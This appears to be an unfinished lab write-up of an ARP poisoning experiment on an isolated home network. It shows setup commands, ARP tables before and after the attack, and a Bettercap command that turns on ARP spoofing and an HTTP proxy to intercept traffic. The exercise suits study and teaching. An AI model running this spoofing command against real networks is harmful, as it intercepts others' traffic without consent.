Introduction
------------

The goal of this expirement is to demonstrate how ARP posioning changes values
inside of the ARP table attacked devices.

Expiremental Setup
------------------
Inside of an isolated unmanaged network, an attacker performing an ARP spoofing
attack, man in the middles http requests to a website running on a device in the 
local network.

- 1 Netgear Max Unmanaged Switch
- 2 Raspberry Pi 3 running Raspbian-Stretch (v4.14)
- 1 Lenovo T480 running Monopticon v0.1.1 (deadbeef) and Bettercap v2.22

### Network Design

The photo below shows the yellow ethernet cables

The addresses are statically shown below in the diagram.

Initial Setup
-------------

# Cocco
```zsh
> sudo apt install vim tmux nginx
# changed hostname
# enabled ssh
> enable sshd w/ password
> sudo vim /etc/dhcpdc.conf
# static 10.0.0.3
> wget -r https://soapbox.nskelsey.com --convert-links
> systemctl enable nginx
> cp -fr soapbox.nskelsey.com/* /var/www/html/
```

# Bruno
```zsh
> sudo apt install vim tmux
> enable sshd w/ password
# idem w/o nginx
```


### Normal ARP Table
```
10.0.0.2 b8:27:eb:71:b2:3e # Bruno
10.0.0.3 cc:cc: # Cocco
         aa:aa: # Attacker
```

### Poisioning machine

```zsh
> ip address add dev enp0s31f6 10.0.0.1/24

> sudo su
> /home/synnick/go/bin/bettercap -iface enp0s31f6 -eval 'net.recon on; http.proxy on; arp.spoof on; ticker on;'
```


After Poisioning
----------------

ARP Table of Bruno
```
10.0.0.3 aa:aa: # Attacker
```

ARP Table of Cocco
```
10.0.0.2 aa:aa: # Attacker
```

[img](src)


### Attack Results

As shown the once the Lenovo machine starts broadcasting IP addresses

[img](src)
